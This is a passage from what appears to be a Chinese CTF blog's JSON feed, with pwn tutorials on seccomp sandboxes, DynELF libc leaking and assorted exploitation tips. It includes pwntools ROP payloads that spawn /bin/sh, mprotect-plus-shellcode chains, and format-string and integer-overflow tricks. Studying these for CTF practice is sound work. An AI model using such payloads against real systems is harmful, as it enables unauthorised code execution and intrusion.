operator\">!</span>v1 <span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 初始化失败，v1&lt;=0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//seccomp_rule_add 添加规则</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//v1 对应上面初始化的返回值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW（黑名单）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">231LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\">// seccomp_load - Load the current seccomp filter into the kernel</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">//load 成功则返回 0，这里 load 失败会执行 if 内部函数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  \t<span class=\"token comment\">// seccomp_release - Release the seccomp filter state</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  \t<span class=\"token comment\">// 但对已经 load 的过滤规则不影响</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  释放</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjczODY3Ng==\">https://blog.csdn.net/A951860555/article/details/116738676</span></p>\n<p>这里给出关于 <code>seccomp_load</code>  的定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> scmp_filter_ctx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>scmp_filter_ctx ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Link with <span class=\"token operator\">-</span>lseccomp<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>DESCRIPTION：</p>\n<p>Loads the seccomp filter provided by ctx into the kernel; if the function succeeds the new seccomp filter will be active when the  <code>function returns</code> .  函数返回时过滤开始运行</p>\n<p>返回值：Returns zero on success or one of the following error codes on failure；成功时返回  <code>0</code> ，失败返回对应错误代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vc2VjY29tcF9sb2FkLjMuZW4jREVTQ1JJUFRJT04=\">https://man.archlinux.org/man/seccomp_load.3.en#DESCRIPTION</span></p>\n<h1 id=\"3使用seccomp-tools\"><a class=\"anchor\" href=\"#3使用seccomp-tools\">#</a> 3. 使用 seccomp-tools</h1>\n<p>命令：<br />\nseccomp-tools dump ./pwn</p>\n<p>此处用 buuctf 例题  <code>orw</code>  说明：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<h1 id=\"4绕过\"><a class=\"anchor\" href=\"#4绕过\">#</a> 4. 绕过</h1>\n<p>一般运用 orw 函数的方式进行读取 flag</p>\n<h1 id=\"5注意\"><a class=\"anchor\" href=\"#5注意\">#</a> 5. 注意</h1>\n<p>当使用了 prctl (4, 0) 时</p>\n<p>4 对应的宏是 <code>PR_SET_DUMPABLE</code> ，第二个参数为 0 的话则不能被 dump，为 1 可以被 dump。换句话说，该程序我们无法使用 seccomp-tools dump ./pwn 来查看其系统调用情况，只能靠阅读代码分析。同时在进行 gdb 调试时，执行到 prctl (4, 0) 这行时程序也会被终止。不过只要以 root 身份执行，那么 <code>secccomp-tools</code>  和 gdb 调试都没问题，估计应该是限制了一般身份用户的 dump 行为</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjMxNzQ1NjE=\">https://zhuanlan.zhihu.com/p/363174561</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "title": "DynELF",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>由于在 pwn 题中有时候不给 libc，那么需要我们自己通过泄露函数地址来获得 libc 的基地址，而往往 LibcSearcher 无法准确的得到 libc 版本，那么我们就需要利用 DynELF，这是 pwntools 在早期版本就提供了一个解决方案 ——DynELF 类；利用方式与 ret2libc 类似，都是泄露函数地址来计算得到 libc 基址，通俗地讲，DynELF 就是通过程序漏洞泄露出任意地址内容，结合 ELF 文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>\n<p>并且：<br />\nwrite 函数是最理想的，因为 write 函数的特点在于其输出完全由其参数 size 决定，只要目标地址可读，size 填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响；而 puts, printf 函数会受到诸如‘\\0’, ‘\\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>\n<h1 id=\"使用方式\"><a class=\"anchor\" href=\"#使用方式\">#</a> 使用方式</h1>\n<p>首先需要构造一个函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#addr 为想要获得的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpayload_leak<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token string\">\"write_plt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload_leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfun_addr<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> fun_addr</pre></td></tr></table></figure><p>然后需要实例化该函数（指向 ELF 文件的指针或者使用 ELF 类加载的目标文件至少提供一个作为可选参数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>lead<span class=\"token punctuation\">,</span>pointer<span class=\"token operator\">=</span>pointer_into_ELF_file<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span>ELFObject<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>实例化举例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynEF<span class=\"token punctuation\">(</span> leak<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来可以运用实例化对象来找到想要的地址（通过这个实例 d 的方法 lookup 来搜寻 libc 库函数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#用 read 是因为程序里没有 '/bin/sh' 字符串时，还需要我们写入字符串，一般为 bbs 段内</span></pre></td></tr></table></figure><p>最后的 payload 为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">140</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#顺序为先执行 read 再到 system</span></pre></td></tr></table></figure><p>需要查看 write 函数能不能在程序中实现任意地址的读取打印<br />\n可以时可以用 DynELF</p>\n<p>DynELF 泄露函数方法最方便的使用情况是程序中最好含有 write 函数等输出函数且可以多次反复调用，并且 DynELF 找的是字符串</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkwL2FydGljbGUvZGV0YWlscy84NjY4OTc2MA==\">https://blog.csdn.net/qq_40827990/article/details/86689760</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "title": "堆",
            "date_published": "2023-08-24T12:15:56.000Z",
            "content_html": "<p>chunk 的 p 位设为 1 即上一个 chunk 被使用并且上一个 chunk 可以使用 pre_size 的空间  （用来储存前一个物理相邻的 chunk 的数据 ，（两个都空闲才合并）</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "title": "PWN小技巧",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"centerpwn小技巧center\"><a class=\"anchor\" href=\"#centerpwn小技巧center\">#</a> &lt;center&gt;PWN 小技巧 &lt;/center&gt;</h1>\n<h3 id=\"164位程序与32位程序payload\"><a class=\"anchor\" href=\"#164位程序与32位程序payload\">#</a> 1.64 位程序与 32 位程序 payload</h3>\n<p>​<br />\n64 位程序 payload 要先用 pop_rdi 覆盖 ret 然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32 位程序传参不需要用寄存器）<br />\n32 位程序是调用函数 <strong>先函数本身</strong> ，然后是函数返回地址，再是参数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4009A0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址\n</code></pre>\n<h3 id=\"2注意栈对齐ubuntu18以上格外注意\"><a class=\"anchor\" href=\"#2注意栈对齐ubuntu18以上格外注意\">#</a> 2. 注意栈对齐（Ubuntu18 以上格外注意）</h3>\n<h3 id=\"3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\"><a class=\"anchor\" href=\"#3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\">#</a> 3. 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>返回地址<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Plaintext to be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    接收最好用这个 puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>【有时会直接输出地址以 16 进制形式，我们要直接进行接收】</p>\n<p>例一、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yippie, lets crash: %p\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 例如这种输出</span></pre></td></tr></table></figure><p>接收方式：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#接收回显的参数在栈上的地址，长度是 10，以 16 进制表示</span></pre></td></tr></table></figure><p>例二、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%6s\"</span><span class=\"token punctuation\">,</span> format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 此处输入的是  %7$p  泄露偏移为 7 的地方的值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 打印上面泄露的值</span></pre></td></tr></table></figure><p>接收</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"0x\"</span><span class=\"token punctuation\">)</span>                   <span class=\"token comment\">#原本输出值为 0x76d7e5e9e493e00</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>stroy<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>       <span class=\"token comment\">#以 16 进制接收 16 个字符</span></pre></td></tr></table></figure><h3 id=\"4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\"><a class=\"anchor\" href=\"#4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\">#</a> 4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b'\\n')[:-1].ljust (8,b'\\0'))</h3>\n<h3 id=\"5遇到要绕过strlen函数要绕过时用-bx00-截断\"><a class=\"anchor\" href=\"#5遇到要绕过strlen函数要绕过时用-bx00-截断\">#</a> 5. 遇到要绕过 strlen 函数要绕过时用 b&quot;\\x00&quot; 截断</h3>\n<h3 id=\"6系统调用是调用execvebinshnullnull平常调用为systembinsh\"><a class=\"anchor\" href=\"#6系统调用是调用execvebinshnullnull平常调用为systembinsh\">#</a> 6. 系统调用是调用 execve (&quot;/bin/sh&quot;,NULL,NULL)【平常调用为 system (&quot;/bin/sh&quot;)】</h3>\n<pre><code>32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用（）\n\n当eax=11时即为系统调用号调用命令execve，参数&quot;/bin/sh&quot;赋给ebx\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQR56.png\" alt=\"\" /></p>\n<pre><code>64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用\n</code></pre>\n<h3 id=\"7有mprotect函数可以改变内存的读写权限\"><a class=\"anchor\" href=\"#7有mprotect函数可以改变内存的读写权限\">#</a> 7. 有 mprotect 函数可以改变内存的读写权限</h3>\n<pre><code>mprotect(起始地址，修改内存长度，修改的权限（修改为7） )\n\n指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为00?),修改区间的长度必须是页的整数倍\n\nmem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】\n\n在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行\n\npayload=b&quot;a&quot;*0x2d\n\npayload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)\n\n此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器\n\npayload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)\n\n返回地址为read，\n\n此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)\n</code></pre>\n<h3 id=\"8shellcode编写\"><a class=\"anchor\" href=\"#8shellcode编写\">#</a> 8.shellcode 编写</h3>\n<pre><code>用pwntools生成：\n\nshellcode = asm(shellcraft.sh())\n\nshellcode网址（用的时候不知道为什么不行）：\n\n[https://www.exploit-db.com/](https://www.exploit-db.com/ &quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&quot;)\n\n[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &quot;Shellcodes database for study cases (shell-storm.org)&quot;)\n</code></pre>\n<h3 id=\"9strcmp绕过\"><a class=\"anchor\" href=\"#9strcmp绕过\">#</a> 9.strcmp () 绕过</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png\" alt=\"\" /></p>\n<h5 id=\"str1str2时返回0一般用这个绕过也可以用x00截断\"><a class=\"anchor\" href=\"#str1str2时返回0一般用这个绕过也可以用x00截断\">#</a> str1=str2 时返回 0，一般用这个绕过，也可以用 \\x00 截断</h5>\n<h3 id=\"10switch语句\"><a class=\"anchor\" href=\"#10switch语句\">#</a> 10.switch () 语句</h3>\n<pre><code>switch(表达式)&#123; \n    case 常量表达式1:  语句1;\n    case 常量表达式2:  语句2;\n    … \n    case 常量表达式n:  语句n;\n    default:  语句n+1;\n\n&#125;\n</code></pre>\n<h5 id=\"将表达式的结果与常量表达式依次比较直到相同\"><a class=\"anchor\" href=\"#将表达式的结果与常量表达式依次比较直到相同\">#</a> 将表达式的结果与常量表达式依次比较直到相同</h5>\n<h3 id=\"11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\"><a class=\"anchor\" href=\"#11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\">#</a> 11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 复制到栈上，需要按照复制后的栈填充垃圾字符等等</h3>\n<h3 id=\"12整数溢出漏洞比大小绕过判断\"><a class=\"anchor\" href=\"#12整数溢出漏洞比大小绕过判断\">#</a> 12. 整数溢出漏洞（比大小绕过判断），</h3>\n<pre><code>无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值\n\nunsigned int ( -1 )=max unsigned int\n\nint (-1)= -1\n\n输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）\n</code></pre>\n<h3 id=\"13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\"><a class=\"anchor\" 